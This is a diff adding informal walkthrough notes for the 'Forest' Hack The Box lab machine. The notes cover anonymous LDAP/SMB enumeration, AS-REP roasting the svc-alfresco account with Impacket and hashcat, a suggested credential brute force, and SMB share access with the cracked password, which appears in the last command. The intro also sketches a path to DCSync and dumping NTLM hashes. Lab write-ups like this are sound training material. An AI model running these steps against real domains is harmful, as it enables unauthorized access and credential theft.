@@ -1,0 +1,246 @@
+#########
+he DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. 
+Kerberos pre-authentication disabled can be cracked to gain a foothold. 
+The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. 
+The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes. 
+#########
+
+1-Enumeration:
+    Not shown: 988 closed tcp ports (conn-refused)
+    PORT     STATE    SERVICE      REASON      VERSION
+    88/tcp   open     kerberos-sec syn-ack     Microsoft Windows Kerberos (server time: 2024-02-12 20:15:35Z)
+    135/tcp  open     msrpc        syn-ack     Microsoft Windows RPC
+    139/tcp  open     netbios-ssn  syn-ack     Microsoft Windows netbios-ssn
+    389/tcp  open     ldap         syn-ack     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+    445/tcp  open     microsoft-ds syn-ack     Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+    464/tcp  open     kpasswd5?    syn-ack
+    593/tcp  open     ncacn_http   syn-ack     Microsoft Windows RPC over HTTP 1.0
+    636/tcp  open     tcpwrapped   syn-ack
+    722/tcp  filtered unknown      no-response
+    787/tcp  filtered qsc          no-response
+    3268/tcp open     ldap         syn-ack     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+    3269/tcp open     tcpwrapped   syn-ack
+    Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    Host script results:
+    | smb2-security-mode: 
+    |   3:1:1: 
+    |_    Message signing enabled and required <------- NO SMB RELAY ATTACK
+    |_clock-skew: mean: 2h46m49s, deviation: 4h37m07s, median: 6m49s
+    | smb2-time: 
+    |   date: 2024-02-12T20:15:41
+    |_  start_date: 2024-02-12T19:58:27
+
+    | smb-security-mode: 
+    |   account_used: <blank>
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: required
+    | smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2024-02-12T12:15:38-08:00
+
+    SMB / LDAP:
+        Find domaine name - enumrate LDAP:
+            nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.161
+                DC=htb,DC=local
+                objectSid: 1-5-21-3072663084-364016917-1341370565
+
+                dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
+            |         objectClass: top
+            |         objectClass: group
+            |         cn: Enterprise Read-only Domain Controllers
+            |         description: Members of this group are Read-Only Domain Controllers in the enterprise
+            |         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
+            |         instanceType: 4
+            |         whenCreated: 2019/09/18 10:53:23 UTC
+            |         whenChanged: 2019/09/18 10:53:23 UTC
+            |         uSNCreated: 12429
+            |         uSNChanged: 12431
+            |         name: Enterprise Read-only Domain Controllers
+            |         objectGUID: f9d71231-d92-740-b238-8480a1a03d3
+            |         objectSid: 1-5-21-3072663084-364016917-1341370565-498
+            |         sAMAccountName: Enterprise Read-only Domain Controllers
+            |         sAMAccountType: 268435456
+            |         groupType: -2147483640
+            |         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
+            |         isCriticalSystemObject: TRUE
+            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+            |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+            |         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+
+        |     dn: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
+        |         objectClass: top
+        |         objectClass: group
+        |         cn: Cloneable Domain Controllers
+        |         description: Members of this group that are domain controllers may be cloned.
+        |         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
+        |         instanceType: 4
+        |         whenCreated: 2019/09/18 10:53:23 UTC
+        |         whenChanged: 2019/09/18 10:53:23 UTC
+        |         uSNCreated: 12440
+        |         uSNChanged: 12442
+        |         name: Cloneable Domain Controllers
+        |         objectGUID: d8693b95-c468-ea44-8748-dc45c26dd433
+        |         objectSid: 1-5-21-3072663084-364016917-1341370565-522
+        |         sAMAccountName: Cloneable Domain Controllers
+        |         sAMAccountType: 268435456
+        |         groupType: -2147483646
+        |         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
+        |         isCriticalSystemObject: TRUE
+        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+        |         dSCorePropagationData: 2024/02/12 20:47:51 UTC
+        |         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+
+             dn: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
+        |         objectClass: top
+        |         objectClass: group
+        |         cn: DnsUpdateProxy
+        |         description: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+        |         distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
+        |         instanceType: 4
+        |         whenCreated: 2019/09/18 10:54:03 UTC
+        |         whenChanged: 2019/09/18 10:54:03 UTC
+        |         uSNCreated: 12488
+        |         uSNChanged: 12488
+        |         name: DnsUpdateProxy
+        |         objectGUID: c2c7c95-4bea-8a45-a494-93df6f83979a
+        |         objectSid: 1-5-21-3072663084-364016917-1341370565-1102
+        |         sAMAccountName: DnsUpdateProxy
+        |         sAMAccountType: 268435456
+        |         groupType: -2147483646
+
+        |     dn: CN=Protected Users,CN=Users,DC=htb,DC=local
+        |         objectClass: top
+        |         objectClass: group
+        |         cn: Protected Users
+
+
+                ldapServiceName: htb.local:forest$@HTB.LOCAL
+    |           serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
+
+
+    We can also enum Users via RPC client:
+        rpcclient -U '' 10.10.10.161
+        enumdomusers
+
+
+
+    crackmapexec smb 10.10.10.161 -u "" -p "" 
+        [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+        [+] htb.local\: 
+
+
+    enum4linux -a -u "" -p "" 10.10.10.161 
+        Getting domain SID for 10.10.10.161:
+            Domain Name: Name: HTB                                                                                        
+            Domain Sid: S-1-5-21-3072663084-364016917-1341370565
+
+                                                                                                                                                                            
+            Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)                                                          
+            Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
+            Account: andy  Name: Andy Hislip       Desc: (null)
+            Account: lucinda       Name: Lucinda Berger    Desc: (null)
+            Account: mark  Name: Mark Brandt       Desc: (null)
+            Account: santi Name: Santi Rodriguez   Desc: (null)
+            ccount: sebastien     Name: Sebastien Caron   Desc: (null)
+            Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
+
+            [+] Found domain(s):
+                [+] HTB
+                [+] Builtin
+
+        [+] Password Info for Domain: HTB  <-------- Password Spraying Attack - Kerberos
+                [+] Minimum password length: 7
+                [+] Password history length: 24
+                [+] Maximum password age: Not Set
+
+                [+] Minimum password age: 1 day 4 minutes 
+                [+] Reset Account Lockout Counter: 30 minutes 
+                [+] Locked Account Duration: 30 minutes 
+                [+] Account Lockout Threshold: None
+                [+] Forced Log off Time: Not Set
+
+        [+]  Getting domain group memberships:                                                                                                                        
+                                                                                                                                                            
+            Group: 'Domain Controllers' (RID: 516) has member: HTB\FOREST$                                                                                                
+            Group: 'Domain Guests' (RID: 514) has member: HTB\Guest
+            Group: 'Domain Admins' (RID: 512) has member: HTB\Administrator
+            Group: 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
+            Group: 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
+            Group: 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
+
+            Group: '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
+            Group: 'Schema Admins' (RID: 518) has member: HTB\Administrator
+            Group: 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
+            Group: 'Domain Computers' (RID: 515) has member: HTB\EXCH01$
+
+            Group: 'Organization Management' (RID: 1104) has member: HTB\Administrator
+            Group: 'Domain Users' (RID: 513) has member: HTB\Administrator
+            Group: 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
+            Group: 'Domain Users' (RID: 513) has member: HTB\krbtgt
+            Group: 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
+            Group: 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
+            
+            Group: 'Domain Users' (RID: 513) has member: HTB\sebastien
+            Group: 'Domain Users' (RID: 513) has member: HTB\lucinda
+            Group: 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
+            Group: 'Domain Users' (RID: 513) has member: HTB\andy
+            Group: 'Domain Users' (RID: 513) has member: HTB\mark
+            Group: 'Domain Users' (RID: 513) has member: HTB\santi
+            Group: 'Enterprise Admins' (RID: 519) has member: HTB\Administrator
+            Group: 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
+
+
+
+    We can also know about passwd policy with crackmapexec exec:
+    crackmapexec smb 10.10.10.161 --pass-pol -u "" -p "" 
+
+    #########################################################################################################################
+
+    Pre-Auth Kerberos - ASREPRoast:
+
+    We will try to obtain a TGT Ticket via the svc-alfresco form our Enumeration - Because it seems that svc-alfresco do not require PREAUTH:
+
+            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 htb.local/svc-alfresco -no-pass
+
+                [*] Getting TGT for svc-alfresco
+                $krb5asrep$23$svc-alfresco@HTB.LOCAL:374d04e5a53682818ae3e04e02a102dc$.......................
+
+            Same cmd but without specified accounts:
+                python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local
+
+        We past all the TGT Hash in a file to hashcat (ASREPRoast):
+            hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200
+
+        We found a password for svc-alfresco
+
+
+    If it doesn't work we possibly need to Brute Force with users we find in enum4linux:
+        crackmapexec smb 10.10.10.161 -u userlist.txt -p rockyou.txt
+
+    #########################################################################################################################
+
+    We will try to access to SMB shares via svc-alfresco creds:
+        crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p '<Passwd>' --shares -d htb.local
+
+            Share           Permissions     Remark
+            -----           -----------     ------
+            ADMIN$                          Remote Admin
+            C$                              Default share
+            IPC$                            Remote IPC
+            NETLOGON        READ            Logon server share 
+            SYSVOL          READ            Logon server share 
+
+    We will connect to check:
+        smbclient //10.10.10.161/NETLOGON -U 'htb.local\svc-alfresco%s3rvice'
+
